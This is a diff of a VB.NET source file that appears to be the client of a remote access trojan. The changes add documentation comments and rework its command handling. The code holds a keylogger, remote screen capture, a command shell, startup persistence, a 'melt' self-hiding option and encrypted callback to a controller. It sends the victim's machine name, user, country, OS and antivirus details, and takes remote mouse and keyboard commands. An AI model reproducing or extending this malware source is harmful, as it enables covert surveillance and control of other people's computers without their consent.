@@ -8,31 +8,124 @@ Imports System.ComponentModel
 Imports System.Security.Principal
 
 Public Class Main
-    Public Shared n As New N
-    Public Shared Sep As String = "*%|%*" ''Separator
-    Public inc As Integer = 0 ''remove after
-    Dim PersistThread As Thread
-    Public gpasswords As String
-    Public ConTimer, ForeTimer, ServeTimer As System.Timers.Timer
-    Public WithEvents C As SocketClient
-    Public HOST As String
-    Public port As Integer
-    Public name As String
-    Public network As String
-    Public copyse As Boolean = 0
-    Public sernam As String
-    Public addtos As Boolean = 0
-    Public StartupKey As String
-    Public melts As Boolean = 0
-    Public Shared pw As String
-    Public Shared pk As String
-    Public userRole As Integer ''admin, user, guest, etc.
-    Public cap As New CRDP ''remote screen capture
-    Public infostring As String
 
+#Region "Initial Vars"
+    Public Shared n As New N
+    ''' <summary>
+    ''' Data separator
+    ''' </summary>
+    Public Shared Sep As String = n.splitmain
+    ''' <summary>
+    ''' Debuggin connection attempt counter. TODO: remove
+    ''' </summary>
+    Public inc As Integer = 0
+    ''' <summary>
+    ''' Persisting Thread
+    ''' </summary>
+    Dim PersistThread As Thread
+    ''' <summary>
+    ''' Application passwords
+    ''' </summary>
+    Public gpasswords As String
+    ''' <summary>
+    ''' Event timers
+    ''' </summary>
+    Public ConTimer, ForeTimer, ServeTimer As Timers.Timer
+    ''' <summary>
+    ''' Socket instance
+    ''' </summary>s
+    Public WithEvents C As SocketClient
+    ''' <summary>
+    ''' Connection host adress
+    ''' </summary>
+    Public HOST As String
+    ''' <summary>
+    ''' Connection port
+    ''' </summary>
+    Public port As Integer
+    ''' <summary>
+    ''' Naming prefix
+    ''' </summary>
+    Public Shadows name As String
+    ''' <summary>
+    ''' Copy payload
+    ''' </summary>
+    Public copyse As Boolean = 0
+    ''' <summary>
+    ''' Name of executable file
+    ''' </summary>
+    Public sernam As String
+    ''' <summary>
+    ''' Add to stratup
+    ''' </summary>
+    Public addtos As Boolean = 0
+    ''' <summary>
+    ''' Name of Application fodlers and registry entries
+    ''' </summary>
+    Public StartupKey As String
+    ''' <summary>
+    ''' Melt
+    ''' </summary>
+    Public melts As Boolean = 0
+    ''' <summary>
+    ''' Cureent RC4 password
+    ''' </summary>
+    Public Shared pw As String
+    ''' <summary>
+    ''' RSA Public Key
+    ''' </summary>
+    Public Shared pk As String
+    ''' <summary>
+    ''' User role on computer
+    ''' </summary>
+    Public userRole As Integer
+    ''' <summary>
+    ''' Screen Capture Instance
+    ''' </summary>
+    Public cap As New CRDP
+    ''' <summary>
+    ''' Computer information string
+    ''' </summary>
+    Public infostring As String
+    ''' <summary>
+    ''' Computer machine name and username
+    ''' </summary>
     Dim pc As String = Environment.MachineName & "\" & Environment.UserName
+    ''' <summary>
+    ''' Computer culture english name
+    ''' </summary>
     Private culture As String = CultureInfo.CurrentCulture.EnglishName
+    ''' <summary>
+    ''' Computer culture
+    ''' </summary>
     Private country As String = culture.Substring(culture.IndexOf("("c) + 1, culture.LastIndexOf(")"c) - culture.IndexOf("("c) - 1)
+    ''' <summary>
+    ''' Stored (previous) current window title
+    ''' </summary>
+    Private makel As String = ""
+    ''' <summary>
+    ''' CPU performance counter
+    ''' </summary>
+    Dim cpu As New PerformanceCounter()
+    ''' <summary>
+    ''' Webcam stream TODO: Implement
+    ''' </summary>
+    Dim streamWebcam As Boolean = False ''??
+    ''' <summary>
+    ''' Keylogger data file extension
+    ''' </summary>
+    Dim klfext As String = ".cab" ''keylogger file extension
+    ''' <summary>
+    ''' Keylogger instance
+    ''' </summary>
+    Dim o As New KLogger ''keylogger
+    ''' <summary>
+    ''' CMD shell instance
+    ''' </summary>
+    Dim sh As CShell = New CShell
+#End Region
+
+#Region "DLL Functions"
     Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
     Public Declare Function apiBlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer
     Public Declare Function SwapMouseButton Lib "user32" Alias "SwapMouseButton" (ByVal bSwap As Long) As Long
@@ -42,18 +135,14 @@ Public Class Main
     Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
     Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpCommandString As String, ByVal lpReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long ''disk drive
     Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
-    Private makel As String = ""
-    Dim cpu As New PerformanceCounter()
-    Dim prfs(), text1, text2 As String
-    Const spl = "|\|%x*x%|/|"
-    Dim PictureBox1 As Windows.Forms.PictureBox
-    Dim streamWebcam As Boolean = False ''??
-    Dim klfext As String = ".cab" ''keylogger file extension
-    Dim o As New KLogger ''keylogger
-    Dim sh As CShell = New CShell
     Private Declare Function SendCamMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Int32, ByVal Msg As Int32, ByVal wParam As Int32, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.AsAny)> ByVal lParam As Object) As Int32
     Private Declare Function LockWorkStation Lib "user32.dll" () As Long
+#End Region
 
+    ''' <summary>
+    ''' Get active windows title
+    ''' </summary>
+    ''' <returns>Window title</returns>
     Private Function GetCaption() As String ''get active window title
         Dim Caption As New System.Text.StringBuilder(256)
         Dim hWnd As IntPtr = GetForegroundWindow()
@@ -71,7 +160,6 @@ Public Class Main
         ''temporary preferences
         HOST = "127.0.0.1" ''IP
         port = 92 ''Port
-        network = "chocolatkey" ''Client Name (unique!)
         name = "Wonder_1" ''Client Name (unique!)
         copyse = False ''Copy (to temp)
         'serfol = alaa(5)
@@ -215,8 +303,6 @@ Public Class Main
         cpu.NextValue()
     End Sub
 
-
-
     Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
         End ''TODO remove
     End Sub
@@ -255,10 +341,8 @@ Public Class Main
             Dim T As String
             If trust Then
                 T = Crypt.RC4.rc4(BS(b), pw)
-                InfoLabel.Text = "S: " & T
             Else
                 T = BS(b)
-                InfoLabel.Text = "U: " & T
             End If
 
             Dim A As String() = Split(T, Sep)
@@ -266,14 +350,15 @@ Public Class Main
                 If A(0) = n.connect Then ''first connect
                     kg.KeyLetters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
                     kg.KeyNumbers = "0123456789"
-                    kg.KeyChars = 16 ''length might need to be changed
+                    kg.KeyChars = 16 ''length can be changed
                     pw = kg.Generate()
                     InfoLabel.Text = pw
-                    C.Send(n.connect & Sep & Crypt.RSA.Encrypt(pw, pk).AsBase64String) ''send random rsa encrypted TODO!!!!
+                    C.Send(n.connect & Sep & Crypt.RSA.Encrypt(pw, pk).AsBase64String)
                 ElseIf A(0) = n.response ''recieve key response
                     If A(1) = Crypt.HMACSHA512Hasher.Base64Hash(pw) Then
                         C.Send(n.response) ''report sucessful authentication
                         trust = True ''above is the final unencrypted message
+                        InfoLabel.Text = "Authenticated"
                     Else
                         errorcount += 1
                     End If
@@ -281,7 +366,7 @@ Public Class Main
                     errorcount += 1
                 End If
                 If errorcount >= 3 Then
-                    MsgBox("errorcount too igh")
+                    InfoLabel.Text = "Too many failed auths, disconnecting"
                     C.DisConnect() ''disconnect if failed 3 or more times
                 End If
             Else
@@ -322,7 +407,7 @@ B:
                     Case n.getinfo ' information
                         ''Dim gid As String = TODO: unique id
                         ''HKEY_LOCAL_MACHINE\SYSTEM\MountedDevices\\DosDevices\C:
-                        ''TODO: Add info?
+                        ''TODO: Add userRole
                         C.Send(n.getinfo & Sep & name & Sep & pc & Sep & country & Sep & My.Computer.Info.OSFullName & " (" & My.Computer.Info.OSVersion & ")" & Sep & getanti())
                     Case n.uninstall ''todo: improve
                         Try
@@ -347,11 +432,10 @@ B:
                         Dim scr = Screen.AllScreens(A(1))
                         CRDP.cscreen = scr
                         C.Send(n.changescreen & Sep & scr.Bounds.Size.Width & Sep & scr.Bounds.Size.Height)
-                    Case n.getscreen ' Start Capture
+                    Case n.getscreen ' Start/Get Capture
                         Dim SizeOfimage As Integer = A(1)
                         Dim Split As Integer = A(2)
                         Dim Quality As Integer = A(3)
-
                         Dim Bb As Byte() = CRDP.Cap(SizeOfimage, Split, Quality)
                         Dim M As New IO.MemoryStream
                         Dim CMD As String = n.getscreen & Sep
@@ -361,11 +445,12 @@ B:
                         M.Dispose()
                     Case n.mouseclick ' mouse clicks
                         Cursor.Position = New Point(A(1), A(2))
-                        mouse_event(A(3), 0, 0, 0, 1)
+                        mouse_event(A(3), 0, 0, 0, 0)
                     Case n.mousemove '  mouse move
                         Cursor.Position = New Point(A(1), A(2))
+                        mouse_event(1, 0, 0, 0, 0)
                     Case n.keyboard ''key press
-                        SendKeys.SendWait(A(1))
+                        keybd_event(A(1), 0, A(2), 0)
                     Case n.close ''exit instance
                         End
                     Case n.logoff ''log off
@@ -425,7 +510,6 @@ B:
 
                         Dim clres As ManagementObjectCollection = New ManagementObjectSearcher("SELECT CommandLine, ProcessId FROM Win32_Process").Get
                         Dim cpres As ManagementObjectCollection = New ManagementObjectSearcher("SELECT IDProcess, PercentProcessorTime FROM Win32_PerfFormattedData_PerfProc_Process").Get
-                        Dim cores As ManagementObjectCollection = New ManagementObjectSearcher("SELECT * FROM ComputerSystem").Get
 
                         Dim query = "SELECT * FROM Win32_Processor"
                         Dim num_cores As Integer = 0
@@ -433,8 +517,8 @@ B:
                         For Each proc As ManagementObject In searcher.Get
                             num_cores += Integer.Parse(proc("NumberOfCores").ToString())
                         Next
-                        ''Todo: CPU Usage
 
+                        ''Todo: Fix CPU Usage
                         Try
                             Dim i As Integer = 0
                             For Each mgmtObj As ManagementObject In clres
@@ -518,7 +602,7 @@ B:
                             allProcess += Proc.ProcessName & responding & Sep2 _
                             & Proc.Id & Sep2 _
                             & cp & Sep2 _
-                            & Convert.ToString(Proc.WorkingSet64) & Sep2 _
+                            & Convert.ToString(Proc.PrivateMemorySize64) & Sep2 _
                             & Proc.MainWindowTitle & Sep2 &
                             cl & Sep2 _
                             & z & Sep2
@@ -669,6 +753,11 @@ B:
     End Sub
 #End Region
 
+    ''' <summary>
+    ''' Add a string to a string with the data separator
+    ''' </summary>
+    ''' <param name="str">Existing string</param>
+    ''' <param name="add">String to add</param>
     Sub AddTo(ByVal str As String, ByVal add As String)
         str += add & Sep
     End Sub
@@ -713,6 +802,14 @@ B:
         ''MsgBox(response)
     End Sub
 
+    ''' <summary>
+    ''' Web request poster
+    ''' </summary>
+    ''' <param name="URL">URL of server</param>
+    ''' <param name="useragent">User agent</param>
+    ''' <param name="method">Request method</param>
+    ''' <param name="POSTdata">Data to post</param>
+    ''' <returns></returns>
     Function WRequest(URL As String, useragent As String, method As String, POSTdata As String) As String
         Dim responseData As String = ""
         Try
